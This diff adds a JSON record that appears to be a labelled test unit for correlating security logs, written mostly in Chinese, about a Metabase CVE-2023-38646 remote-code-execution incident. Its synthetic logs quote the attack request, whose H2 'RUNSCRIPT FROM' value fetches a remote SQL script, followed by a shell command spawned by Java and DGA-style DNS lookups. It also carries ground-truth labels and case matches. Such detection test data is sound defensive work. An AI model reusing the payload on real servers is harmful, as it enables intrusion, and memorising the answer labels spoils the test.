@@ -1,0 +1,206 @@
+{
+ "unit": 1032,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Metabase CVE-2023-38646 未授权 RCE（api/setup/validate H2 RUNSCRIPT）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "dns",
+  "dns",
+  "dns"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-16 23:24:38",
+   "source": "waf",
+   "log_id": "WAF0310589",
+   "content": "/api/setup/validate {\"db\":\"h2\",\"init\":\"RUNSCRIPT FROM 'http://10.20.5.19/x.sql'\"} Mozilla/5.0 (Macintosh; Inte",
+   "event_id": "1032-WAF0310589"
+  },
+  {
+   "timestamp": "2026-06-16 23:24:40",
+   "source": "web",
+   "log_id": "WEB0312610",
+   "content": "/api/setup/validate {\"db\":\"h2\",\"init\":\"RUNSCRIPT FROM 'http://10.20.5.19/x.sql'\"} Mozilla/5.0 (Macintosh; Inte",
+   "event_id": "1032-WEB0312610"
+  },
+  {
+   "timestamp": "2026-06-16 23:24:41",
+   "source": "rasp",
+   "log_id": "RASP0343631",
+   "content": "https://app-java-190.ops-corp.com/api/setup/validate {\"h2_init\": \"RUNSCRIPT\"} Mozilla/5.0 (Macintosh; Intel Ma",
+   "event_id": "1032-RASP0343631"
+  },
+  {
+   "timestamp": "2026-06-16 23:26:41",
+   "source": "hids",
+   "log_id": "HID0336594",
+   "content": "id -a /usr/bin/id id -a <== /bin/sh -c 'id -a' <== /usr/bin/java -jar metabase.jar",
+   "event_id": "1032-HID0336594"
+  },
+  {
+   "timestamp": "2026-06-16 23:56:41",
+   "source": "dns",
+   "log_id": "DNS0320789",
+   "content": "9c49ebe3.djqkps-f2a0.io A 10.10.33.65",
+   "event_id": "1032-DNS0320789"
+  },
+  {
+   "timestamp": "2026-06-16 23:57:29",
+   "source": "dns",
+   "log_id": "DNS0320794",
+   "content": "0e038dd9.djqkps-f2a0.io A 10.10.24.43",
+   "event_id": "1032-DNS0320794"
+  },
+  {
+   "timestamp": "2026-06-16 23:59:09",
+   "source": "dns",
+   "log_id": "DNS0320802",
+   "content": "b908e184.djqkps-f2a0.io A 192.0.2.91",
+   "event_id": "1032-DNS0320802"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-001",
+   "name": "Log4Shell JNDI 注入（LDAP 回连 + Base64 命令执行）",
+   "summary": "Web 参数注入 ${jndi:ldap://…} → 应用侧 JNDI 解析并回连攻击者 LDAP → 主机侧 java 进程派生子 shell 执行命令。",
+   "matched_steps": 1,
+   "total_steps": 3,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S3",
+     "action_id": "log4shell_java_child_cmd",
+     "label": "java 进程派生子 shell 执行命令",
+     "event_ids": [
+      "1032-HID0336594"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "generic": true
+    }
+   ],
+   "source_mismatches": [],
+   "keyword_score": 0,
+   "keyword_details": [],
+   "mitre": [
+    "T1190",
+    "T1059.004",
+    "T1105"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2"
+   ],
+   "before_steps": [
+    "S1",
+    "S2"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0
+  },
+  {
+   "case_id": "CASE-002",
+   "name": "Tomcat PUT 上传 JSP webshell + DNS C2 心跳",
+   "summary": "PUT 方法把 JSP webshell 写入上传目录 → 应用侧记录 webshell 上传与 exec 标记 → Tomcat 进程派生子 shell 执行探针 → 数小时后 DGA 风格域名突发解析。",
+   "matched_steps": 1,
+   "total_steps": 4,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S4",
+     "action_id": "dga_hex_subdomain_beacon",
+     "label": "DGA 风格子域突发解析",
+     "event_ids": [
+      "1032-DNS0320802"
+     ],
+     "sources": [
+      "dns"
+     ],
+     "generic": true
+    }
+   ],
+   "source_mismatches": [],
+   "keyword_score": 0,
+   "keyword_details": [],
+   "mitre": [
+    "T1190",
+    "T1505.003",
+    "T1071.004"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "before_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 1,
+  "total_steps": 3,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S3",
+    "label": "java 进程派生子 shell 执行命令",
+    "sources": [
+     "hids"
+    ],
+    "generic": true,
+    "event_ids": [
+     "1032-HID0336594"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1",
+   "S2"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1",
+   "S2"
+  ],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 0,
+  "mitre": [
+   "T1190",
+   "T1059.004",
+   "T1105"
+  ]
+ }
+}
